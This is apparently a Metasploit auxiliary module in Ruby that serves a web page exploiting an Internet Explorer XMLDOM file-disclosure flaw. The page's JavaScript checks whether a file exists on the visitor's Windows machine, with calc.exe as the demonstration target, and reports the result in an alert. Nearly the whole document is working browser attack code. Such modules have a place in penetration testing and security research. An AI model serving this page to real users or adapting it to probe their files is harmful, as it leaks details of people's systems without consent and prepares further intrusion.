##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Microsoft Internet Explorer XMLDOM File Disclosure",
      'Description'    => %q{
        This module will use an XMLDOM object to leak a remote user's filename
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'References'     =>
        [
          [ 'URL', 'http://metasploit.com' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Generic', {} ],
        ],
      'DisclosureDate' => "Apr 1 2013",
      'DefaultTarget'  => 0))
  end

  def js
    %Q|
    #{js_ie_addons_detect}

    window.onload = function() {
      var files = ['c:\\\\windows\\\\system32\\\\calc.exe'];
      var foundFiles = ie_addons_detect.checkFiles(files);
      if (foundFiles.length > 0) {
        alert(foundFiles);
      } else {
        alert("nothing found");
      }
    };
    |
  end

  def html
    %Q|
    <html>
    <head>
    </head>
    <body>
    <script>
    #{js}
    </script>
    </body>
    </html>
    |
  end

  def run
    exploit
  end

  def on_request_uri(cli, request)
    send_response(cli, html)
  end

end
